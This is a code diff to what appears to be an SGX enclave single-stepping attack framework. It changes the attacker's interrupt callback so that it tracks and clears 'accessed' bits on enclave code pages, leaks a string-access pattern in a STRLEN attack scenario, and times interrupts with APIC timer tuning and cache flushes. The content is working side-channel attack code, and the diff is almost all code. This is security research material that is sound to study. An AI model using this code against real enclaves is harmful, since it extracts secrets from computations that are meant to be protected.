@@ -56,14 +56,16 @@ uint64_t *pmd_encl = NULL;
 /* Called before resuming the enclave after an Asynchronous Enclave eXit. */
 void aep_cb_func(void) {
     uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
-    info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
+    uint64_t a = is_enclave_exec_accessed();
+    uint64_t a_page = a ? a - (uint64_t)get_enclave_base() : 0;
+    info("^^ enclave RIP=%#09llx; ACCESSED=%d (%#lx)", erip, a != 0, a_page);
     irq_cnt++;
 
 /* XXX insert custom attack-specific side-channel observation code here */
 #if (ATTACK_SCENARIO == STRLEN)
     ASSERT(pte_str_encl);
     if (ACCESSED(*pte_str_encl)) {
-        info("accessed!");
+        info("string accessed!");
         strlen_nb_access++;
     }
     *pte_str_encl = MARK_NOT_ACCESSED(*pte_str_encl);
@@ -77,16 +79,16 @@ void aep_cb_func(void) {
     }
 
     /*
-     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
-     * referencing the enclave code page about to be executed, so as to be able
-     * to filter out "zero-step" results that won't set the accessed bit.
+     * NOTE: We explicitly clear all "accessed" bits of the _unprotected_ PTEs
+     * referencing the enclave code pages, so as to be able to filter out
+     * "zero-step" results that won't set the accessed bit.
      */
-    *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
+    mark_enclave_exec_not_accessed();
 
     /*
      * Configure APIC timer interval for next interrupt.
      *
-     * NOTE: Clearing the PMD "accessed" bit forces the CPU to take a
+     * NOTE: _Additionally_ clearing the PMD "accessed" bit forces the CPU to take a
      * ucode-assisted page-table walk for the first instruction following
      * ERESUME, which causes that instruction to be much longer. We
      * additionally flush this PMD from the cache to further delay the
@@ -95,7 +97,6 @@ void aep_cb_func(void) {
     if (do_irq) {
         *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
         flush(pmd_encl);
-        flush(pte_encl);
         apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
     }
 }
@@ -157,6 +158,7 @@ void attacker_config_page_table(void) {
     print_pte(pte_encl);
     ASSERT(PRESENT(*pte_encl));
 #endif
+    mark_enclave_exec_not_accessed();
 
     // print_page_table( get_enclave_base() );
     ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
